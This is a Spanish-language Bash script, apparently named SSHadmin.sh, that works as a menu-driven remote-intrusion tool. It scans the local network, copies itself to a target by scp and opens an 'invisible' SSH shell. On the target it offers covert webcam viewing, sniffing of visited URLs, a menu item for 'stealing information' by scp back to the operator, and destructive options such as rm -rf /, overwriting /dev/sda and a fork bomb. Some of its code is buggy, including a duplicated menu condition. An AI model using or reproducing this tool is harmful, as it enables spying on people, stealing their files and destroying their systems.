#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Ips data
ips_locales=$(hostname -I | cut -d '.' -f 1-2).1.1-254
first_octet=$ips_locales | cut -d '.' -f 1
pasarela=$(route -n | cut -d ' ' -f 10 | tail -n 3 | head -n 1) # Pasarela
mi_ip=$(hostname -I)

if [ "$(id -u)" = "0" ]; then

  clear
  echo -e "$grayColour-> Comprobación de programas instalados...$endColour"
  sleep 2

  if [ ! -x /usr/bin/macchanger ];then
    echo -e -n "\n$redColour->$endColour$yellowColour Programa$redColour macchanger$endColour$yellowColour no instalado, se procede a instalar...\n\n$endColour "
    sleep 2
    apt-get install macchanger

  else
    echo -e "\n$redColour->$endColour$yellowColour Programa$redColour macchanger$endColour$yellowColour instalado$endColour"
    sleep 2
  fi

  if [ ! -x /usr/bin/mplayer ];then
    echo -e -n "\n$redColour->$endColour$yellowColour Programa$redColour mplayer$endColour$yellowColour no instalado, se procede a instalar...\n\n$endColour "
    sleep 2
    apt-get install mplayer

  else
    echo -e "\n$redColour->$endColour$yellowColour Programa$redColour mplayer$endColour$yellowColour instalado$endColour"
    sleep 2
  fi

  if [ ! -x /usr/bin/ssh ];then
    echo -e -n "\n$redColour->$endColour$yellowColour Programa$redColour ssh$endColour$yellowColour no instalado, se procede a instalar...\n\n$endColour "
    sleep 2
    apt-get install ssh

  else
    echo -e "\n$redColour->$endColour$yellowColour Programa$redColour ssh$endColour$yellowColour instalado$endColour"
    sleep 2
  fi

  if [ ! -x /usr/bin/nmap ];then
    echo -e -n "\n$redColour->$endColour$yellowColour Programa$redColour nmap$endColour$yellowColour no instalado, se procede a instalar...\n\n$endColour "
    sleep 2
    apt-get install nmap

  else
    echo -e "\n$redColour->$endColour$yellowColour Programa$redColour nmap$endColour$yellowColour instalado$endColour"
    sleep 2
  fi

  if [ ! -x /usr/bin/Xvfb ];then
    echo -e -n "\n$redColour->$endColour$yellowColour Programa$redColour Xvfb$endColour$yellowColour no instalado, se procede a instalar...\n\n$endColour "
    sleep 2
    apt-get install Xvfb

  else
    echo -e "\n$redColour->$endColour$yellowColour Programa$redColour Xvfb$endColour$yellowColour instalado$endColour\n"
    sleep 2
  fi

  clear
  echo -e -n "$yellowColour->Indique en qué máquina se encuentra$redColour (local/remota)$endColour:$endColour "
  read local_remota

  if [ "$local_remota" = "local" ]; then
    clear
    sleep 2
    echo -e "$blueColour->$endColour$yellowColour Se va a proporcionar un listado de los usuarios conectados a la red local$endColour\n"
    sleep 2
    echo -e "$redColour[Esto puede tardar unos segundos...]$endColour\n"
    nmap localhost -sP $ips_locales >> listado_ips && cat listado_ips | grep "MAC" | cut -d ' ' -f 3 >> listado_MACs
    cat listado_ips | grep "Nmap" | grep "$first_octet" | cut -d ' ' -f 5 >> listado_ipsG && rm listado_ips
    sed '/https:/d' listado_ipsG >> listado_ips && rm listado_ipsG
    sed '/localhost/d' listado_ips >> listado_ips2 && rm listado_ips && mv listado_ips2 listado_ips
    sed '/addresses/d' listado_ips >> listado_ips2 && rm listado_ips && mv listado_ips2 listado_ips

    while read line
      do

        echo "$line  -> " >> listado_Ips

    done < listado_ips

    rm listado_ips && mv listado_Ips listado_ips
    paste -d " " listado_ips listado_MACs >> listado_Nmap && rm listado_ips listado_MACs
    sed '/192.168.1.1/d' listado_Nmap >> listado_Nmap2 && rm listado_Nmap && mv listado_Nmap2 listado_Nmap
    cat listado_Nmap | head -n -1 >> listado_Nmap2 && rm listado_Nmap && mv listado_Nmap2 listado_Nmap
    echo -e -n "$yellowColour-> Indica el nombre de tu tarjeta de red:$endColour "
    read mi_tarjetaRed
    mi_MAC=$(macchanger -s $mi_tarjetaRed | cut -d ' ' -f 3 | tail -n 1)
    echo " "
    cat listado_Nmap
    echo -e "\nTu ip privada: $mi_ip|| Tu dirección MAC: $mi_MAC\n"
    sleep 1
    echo -e "$blueColour->$endColour$yellowColour Las ip's han sido guardadas$endColour\n"
    sleep 4
    echo -e "$blueColour->$endColour$yellowColour Cargando interfaz del programa...$redColour (local)$endColour$endColour\n"
    sleep 3
    while true
      do
        clear
        sleep 0.2
        echo -e "  $blueColour╭━━━┳━━━┳╮╱╭╮╱╱╱╱╭╮$endColour"
        sleep 0.2
        echo -e "  $blueColour┃╰━━┫╰━━┫╰━╯┣━━┳━╯┣╮╭┳┳━╮$endColour"
        sleep 0.2
        echo -e "  $blueColour╰━━╮┣━━╮┃╭━╮┃╭╮┃╭╮┃╰╯┣┫╭╮╮$endColour"
        sleep 0.2
        echo -e "  $blueColour┃╰━╯┃╰━╯┃┃╱┃┃╭╮┃╰╯┃┃┃┃┃┃┃┃$endColour"
        sleep 0.2
        echo -e "  $blueColour╰━━━┻━━━┻╯╱╰┻╯╰┻━━┻┻┻┻┻╯╰╯$endColour"
        sleep 1
        echo -e "$redColour ------------------------------------------------------------$endColour"
        sleep 1
        echo -e "1.$grayColour  Ver direcciones IP's de la red$redColour (equipo local)$endColour$endColour"
        sleep 0.2
        echo -e "2.$grayColour  Iniciar proceso de copia de fichero$redColour (equipo local-remoto)$endColour$endColour"
        sleep 0.2
        echo -e "3.$grayColour  Simple conexión remota vía SSH [-X]$redColour (equipo local-remoto)$endColour$endColour"
        sleep 0.2
        echo -e "4.$grayColour  Simple conexión remota vía SSH$redColour (equipo local-remoto)$endColour$endColour"
        sleep 0.2
        echo -e "5.$grayColour  Conexión remota vía SSH invisible$redColour (equipo local-remoto)$endColour$endColour"
        sleep 2
        echo -e "$redColour ------------------------------------------------------------$endColour"
        echo -e -n "$yellowColour-> Escoge una opción:$endColour "
        read opcion

        case $opcion in

          1 ) echo -e "\n$yellowColour-> Listando ip's guardadas con sus direscciones MAC correspondientes$endColour\n"
              sleep 2
              cat listado_Nmap
              echo -e "$redColour"
              echo -e "Presiona <Enter> para continuar...$endColour\n"
              read

          ;;

          2 ) echo -e -n "\n$yellowColour-> Nombre de usuario del equipo remoto:$endColour "
              read name_remote
              echo -e -n "\n$yellowColour-> Ip privada del equipo:$endColour "
              read ip_remote
              sleep 2
              echo -e "\n$redColour-> A continuación va a tener que introducir la contraseña del equipo remoto...$endColour\n"
              sleep 2
              scp SSHadmin.sh $name_remote@$ip_remote:/tmp
              echo -e "\n$yellowColour-> Archivo transferido correctamente, ejecute la opción 3 para acceder al sistema$endColour\n"
              sleep 5

          ;;

          3 ) echo -e -n "\n$yellowColour-> Nombre de usuario del equipo remoto:$endColour "
              read name_remote
              echo -e -n "\n$yellowColour-> Ip privada del equipo:$endColour "
              read ip_remote
              sleep 2
              echo -e "\n$redColour-> A continuación va a tener que introducir la contraseña del equipo remoto...$endColour"
              sleep 2
              echo -e "\n$redColour-> Una vez dentro accede al directorio /tmp del sistema remoto, encontrarás este mismo ejecutable$endColour"
              sleep 5
              echo -e "\n$redColour-> Deberás ejecutar el fichero en modo remoto$endColour\n"
              sleep 4
              ssh -X -p 22 $name_remote@$ip_remote

          ;;

          4 ) echo -e -n "\n$yellowColour-> Nombre de usuario del equipo remoto:$endColour "
              read name_remote
              echo -e -n "\n$yellowColour-> Ip privada del equipo:$endColour "
              read ip_remote
              sleep 2
              echo -e "\n$redColour-> A continuación va a tener que introducir la contraseña del equipo remoto...$endColour"
              sleep 2
              echo -e "\n$redColour-> Una vez dentro accede al directorio /tmp del sistema remoto, encontrarás este mismo ejecutable$endColour"
              sleep 5
              echo -e "\n$redColour-> Deberás ejecutar el fichero en modo remoto$endColour"
              sleep 4
              echo -e "\n$redColour-> Esta opción es para ejecutar la opción 5 de redirección gráfica$endColour\n"
              sleep 4
              ssh -p 22 $name_remote@$ip_remote

          ;;

          5 ) echo -e -n "\n$yellowColour-> Nombre de usuario del equipo remoto:$endColour "
              read name_remote
              echo -e -n "\n$yellowColour-> Ip privada del equipo:$endColour "
              read ip_remote
              sleep 2
              echo -e "\n$redColour-> A continuación va a tener que introducir la contraseña del equipo remoto...$endColour"
              sleep 2
              echo -e "\n$redColour-> Una vez dentro accede al directorio /tmp del sistema remoto, encontrarás este mismo ejecutable$endColour"
              sleep 5
              echo -e "\n$redColour-> Deberás ejecutar el fichero en modo remoto$endColour\n"
              sleep 4
              echo -e "$redColour-> Vas a entar en modo invisible, algunos comandos no funcionarán$endColour\n"
              sleep 4
              ssh -o UserKnownHostsFile=/dev/null -T $name_remote@$ip_remote /bin/bash -i

          ;;

          * ) echo "Opcion incorrecta"
              sleep 2
            break
          ;;

        esac
    done

  elif [ "$local_remota" = "remota" ]; then
    while true
      do
      clear
      echo -e "$blueColour->$endColour$yellowColour Cargando interfaz del programa...$redColour (remota)$endColour$endColour\n"
      sleep 3
      clear
      sleep 0.2
      echo -e "  $blueColour╭━━━┳━━━┳╮╱╭╮╱╱╱╱╭╮$endColour"
      sleep 0.2
      echo -e "  $blueColour┃╰━━┫╰━━┫╰━╯┣━━┳━╯┣╮╭┳┳━╮$endColour"
      sleep 0.2
      echo -e "  $blueColour╰━━╮┣━━╮┃╭━╮┃╭╮┃╭╮┃╰╯┣┫╭╮╮$endColour"
      sleep 0.2
      echo -e "  $blueColour┃╰━╯┃╰━╯┃┃╱┃┃╭╮┃╰╯┃┃┃┃┃┃┃┃$endColour"
      sleep 0.2
      echo -e "  $blueColour╰━━━┻━━━┻╯╱╰┻╯╰┻━━┻┻┻┻┻╯╰╯$endColour"
      sleep 1
      echo -e "$redColour ------------------------------------------------------------$endColour"
      sleep 1
      echo -e "1.$grayColour  Acceso a la cámara$redColour (equipo remoto)$endColour$endColour"
      sleep 0.2
      echo -e "2.$grayColour  Capturador de tráfico de datos - páginas visitadas$redColour (equipo remoto)$endColour$endColour"
      sleep 0.2
      echo -e "3.$grayColour  Robar información vía SCP$redColour (equipo remoto)$endColour$endColour"
      sleep 0.2
      echo -e "4.$grayColour  Ataques al sistema y envenenamiento$redColour (equipo remoto)$endColour$endColour"
      sleep 0.2
      echo -e "5.$grayColour  Redirección gráfica de aplicaciones$redColour (equipo remoto)$endColour$endColour"
      sleep 0.2
      echo -e "6.$grayColour  Mensajes$redColour (equipo remoto)$endColour$endColour"
      sleep 0.2
      echo -e "7.$grayColour  Matar proceso de redirección gráfica$redColour (equipo remoto)$endColour$endColour"
      sleep 2
      echo -e "$redColour ------------------------------------------------------------$endColour"
      echo -e -n "$yellowColour-> Escoge una opción:$endColour "
      read opcion

      case $opcion in

        1 ) echo -e "\n$yellowColour-> Accediendo a la cámara del dispositivo...$endColour"
            sleep 2
            echo -e -n "\n$yellowColour-> Nombre de usuario del equipo remoto:$endColour "
            read user_normal
            echo " "
            export DISPLAY=:0
            sudo -u $user_normal mplayer -fps 20 -cache 50 -tv driver=v4l2:width=64:height=48:device=/dev/video0 tv://
            echo -e "$redColour"
            echo -e "Presiona <Enter> para volver al menú principal...$endColour\n"
            read

        ;;

        2 ) echo " "
            apt-get install dsniff
            clear
            echo -e "\n$yellowColour-> Analizando el tráfico de la red...$endColour\n"
            sleep 2
            echo -e "\n$yellowColour-> Las páginas visitadas serán mostradas en texto plano...$endColour\n"
            sleep 2
            urlsnarf | grep "http://"

        ;;

        3 ) echo -e "\n$blueColour-> Robo de información$endColour\n"
            sleep 2
            echo -e -n "$yellowColour-> Ruta exacta de los archivos a transferir [desde /home/]:$endColour "
            read ruta_files
            echo -e -n "\n$yellowColour-> Ruta de ubicación (de tu equipo) donde quieres guardar los archivos [desde /home/]:$endColour "
            read ruta_local
            echo -e -n "\n$yellowColour-> Indica el nombre de usuario de tu equipo:$endColour "
            read my_username
            echo -e -n "\n$yellowColour-> Indica tu ip privada:$endColour "
            read mi_ip_privada
            sleep 2
            echo -e "\n$yellowColour-> Transfiriendo archivos...\n$endColour"
            sleep 3
            scp $ruta_files $my_username@$mi_ip_privada:$ruta_local
            echo -e "\n$yellowColour-> Archivos transferidos correctamente$endColour"
            sleep 3

        ;;

        4 ) echo -e "\n$blueColour-> Ataques al sistema y envenenamiento$endColour\n"
            sleep 1
            echo -e "1.$grayColour  Borrar contenido de todos los directorios$endColour"
            sleep 0.2
            echo -e "2.$grayColour  Pérdida total de la información en el disco duro$endColour"
            sleep 0.2
            echo -e "3.$grayColour  Sistema en estado de destrucción total - Formateo de disco duro$endColour"
            sleep 0.2
            echo -e "4.$grayColour  Dañar disco duro$endColour"
            sleep 0.2
            echo -e "5.$grayColour  Harakiri - Hoyo negro$endColour"
            sleep 0.2
            echo -e "6.$grayColour  Colapso del sistema$endColour"
            sleep 2
            echo -e "$redColour ------------------------------------------------------------$endColour"
            echo -e -n "$yellowColour-> Escoge una opción:$endColour "
            read opcion_remoto

            if [ "$opcion_remoto" = "1" ]; then
              rm -rf /
            elif [ "$opcion_remoto" = "2" ]; then
              ls –l / > /dev/sda
            elif [ "$opcion_remoto" = "3" ]; then
              Mkfs.ext3 /dev/sda3
            elif [ "$opcion_remoto" = "4" ]; then
              dd if=/dev/random of=/dev/sda
            elif [ "$opcion_remoto" = "5" ]; then
              mv directory /dev/null
            elif [ "$opcion_remoto" = "5" ]; then
              forkbomb(){ forkbomb | forkbomb & }; forkbomb
            fi
        ;;

        5 ) echo -e "\n$blueColour-> Redireccionamiento de aplicaciones$endColour\n"
            sleep 2
            echo -e -n "$yellowColour-> Aplicación del sistema a redireccionar a la salida de pantalla de su equipo:$endColour "
            read programa_redireccion
            echo " "
            sudo Xvfb :10 -ac -screen 0 1024x768x24 &
            export DISPLAY=:0
            $programa_redireccion &

        ;;

        6 ) echo -e "\n$blueColour-> Mensajes$endColour\n"
            sleep 2
            echo -e -n "$yellowColour-> Introduce el mensaje que quieras que aparezca en el equipo remoto:$endColour "
            read mi_mensaje
            echo -e -n "\n$yellowColour-> Nombre de usuario del equipo remoto:$endColour "
            read user_normal
            echo -e "\n$yellowColour-> Enviando mensaje...$endColour\n"
            sleep 3
            export DISPLAY=:0
            sudo -u $user_normal zenity --info --text="$mi_mensaje"
            echo -e "\n$blueColour-> Mensaje enviado$endColour\n"
            sleep 3

        ;;

        7 ) PID_proceso=$(ps -faux | grep sshd | grep root | cut -d ' ' -f 7)
            kill -9 $PID_proceso
        ;;

        * ) echo -e "\n$redColour->Opcion incorrecta$endColour\n"
            sleep 2
          break
        ;;

      esac
    done
  fi
else

  clear
  echo -e "$redColour->AVISO:$endColour$yellowColour Es necesario entrar como superusuario$endColour\n"
  sleep 1

fi
